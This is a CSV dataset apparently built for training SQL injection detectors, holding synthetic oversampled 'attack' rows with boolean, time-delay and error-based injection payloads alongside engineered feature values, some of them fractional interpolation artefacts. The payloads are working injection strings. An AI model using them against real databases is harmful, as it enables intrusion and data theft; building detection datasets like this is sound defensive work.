id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'tnvm' like 'tnvm",nearest_attack_euclidean,R001919,0.07443420353005707,90.77375708782513,27.0,3.9340444455421055,44.0,8.0,27.66322036099297,11.11053672683216,0.48498908226067516,0.08817983313830458,0.3044442601509838,0.12238682445003643,3.0,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,5.110536726832161,0.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000012,attack,boolean,1'  )   as dpmh where 5281  =  5281 and 2006  =  2006,nearest_attack_euclidean,R003510,0.011748667162705262,53.0,20.08329129678839,3.615858404636894,14.0,17.0,18.0,4.0,0.2641509433962264,0.32075471698113206,0.33962264150943394,0.07547169811320754,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,boolean,-2983'  )   or 8571  =  8571--,nearest_attack_euclidean,R002511,0.0,30.0,14.0,3.2825887305018333,2.0,12.0,10.0,6.0,0.06666666666666665,0.4,0.3333333333333333,0.2,1.0,-1.1102230246251565e-16,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000014,attack,boolean,"-7806""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""vlrj"" like ""vlrj",nearest_attack_euclidean,R001045,0.05617543405754997,84.7593210496568,25.15186420993136,3.3979920186067485,17.0,16.0,38.607456839725444,13.151864209931361,0.20074614262358592,0.18893754599866908,0.45518897855242896,0.1551273328253161,0.0,4.0,1.0,0.0,1.0,1.0,0.0,6.151864209931362,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,boolean,"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""ldlp""  =  ""ldlp",nearest_attack_euclidean,R001545,0.17837686705261457,291.710676961437,32.126156559957735,3.6175600290002423,59.0,71.0,124.46761632118344,37.243060640253596,0.2025875549215393,0.24379180338015743,0.4260296031050954,0.12759103859320786,0.0,4.0,0.0,0.0,2.0,2.0,0.0,23.243060640253596,0.0,0.0,6.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,3.9999999999999996,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000016,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R001630,0.01996920323516452,123.35281396239212,28.044101745299017,3.4933787434448327,42.0,13.0,54.29401163532677,14.058802327065354,0.34064387000605784,0.10543738833520837,0.43997076915967137,0.11394797249906248,0.0,4.0,0.0,0.0,0.0,2.0,0.0,8.058802327065354,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000017,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002960,0.15531894917013148,148.4745194627386,33.688387609652096,4.1632884496104685,78.06516282895629,16.0,39.06516282895629,15.344193804826048,0.5258899490535018,0.10794443067039022,0.2627753992944257,0.10339022098168223,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.344193804826048,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000018,attack,boolean,"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb",nearest_attack_euclidean,R000430,0.4197777603151895,64.75878491768344,24.54215471764908,3.7930832617991213,18.62646415294724,14.16861887059632,22.33723774119264,9.626464152947241,0.29005135362676954,0.2187219474148434,0.3429364750304591,0.14829022392792793,0.0,4.0,1.0,0.0,0.0,1.0,0.0,3.0843094352981604,0.0,0.0,0.5421547176490801,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000019,attack,boolean,"1""   )    )    as ngvf where 9912  =  9912 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002720,0.22464262490254913,162.3323214229861,36.55548809486574,4.2843760840135285,79.33292856919444,17.0,47.44390475892592,18.55548809486574,0.4888962795477215,0.10494699668828235,0.29174946252540496,0.11440726123859118,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.55548809486574,0.0,0.0,3.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000020,attack,boolean,"-1663' or elt  (  1032  =  1032,3623  )   and 'yqaj' like 'yqaj",nearest_attack_euclidean,R001338,0.4671378613323526,64.54487296612017,27.162822152568225,4.0905222150764935,21.235898372896127,16.0,18.0,9.308974593224033,0.3284230014402551,0.24819842029460257,0.27922322283142786,0.1441553554337144,4.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.3089745932240322,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000021,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",nearest_attack_euclidean,R001291,0.4500303406731859,161.1432551918724,30.66069770033865,3.7252350430132153,52.0,16.0,64.786045993227,28.3572091986454,0.3242328839416061,0.09976396428972496,0.39998361344984057,0.17601953831882838,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,13.3572091986454,0.0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000022,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'uqyt'  =  'uqyt",nearest_attack_euclidean,R001635,0.1796405517029105,305.52120809045437,38.608754656616185,3.9984886066128285,118.0,34.0,111.73871740368673,41.78249068676764,0.3863045659731094,0.11130809528038747,0.36564682368405554,0.13674051506244753,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,22.782490686767638,0.0,3.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.0
SMOTE_000023,attack,boolean,1'+  (  select trte where 9173  =  9173 and 2006  =  2006,nearest_attack_euclidean,R000606,0.17274327546346746,57.0,24.186905537337665,3.8955843482118864,18.0,17.0,17.0,5.0,0.3157894736842105,0.2982456140350877,0.2982456140350877,0.08771929824561403,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,boolean,"1%'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003612,0.17298474123479404,132.32487821447597,32.56763273111482,4.227366870025632,70.48671455890187,8.78381636555741,35.70289819334447,17.351449096672233,0.5330451030998754,0.06640355423785987,0.2695609033835415,0.13099043927872317,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.78381636555741,1.0,0.0,2.7838163655574104,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000025,attack,boolean,-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,nearest_attack_euclidean,R003104,0.025857505440036118,377.68668221257474,31.06866822125747,3.202341325914922,88.0,50.0,184.5493457700598,55.13733644251494,0.23300757349463275,0.13239066675831407,0.4886171517844453,0.14598460796260787,4.0,-1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,38.13733644251495,0.0,0.0,0.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000026,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000027,attack,boolean,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R002812,0.8036495691488835,178.72376967339756,32.723769673397555,3.78461237423397,58.42827255048165,23.019266796313456,68.91434548990367,28.361884836698778,0.326712631750801,0.12896029052940267,0.3856457434477224,0.15868133427207398,1.7237696733975536,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,15.638115163301224,0.0,1.3618848366987768,3.361884836698777,6.276230326602446,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.276230326602446,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.276230326602446
SMOTE_000028,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R002776,1.6204849309082836,21.212138001368743,10.473482749828907,3.0417464972895765,10.685620751197646,0.9469654996578143,6.526517250171089,3.053034500342182,0.48981314531947956,0.05570385292104797,0.3145363888110498,0.13994661294842273,0.0,2.0530345003421844,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.5265172501710922,0.4734827498289078,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
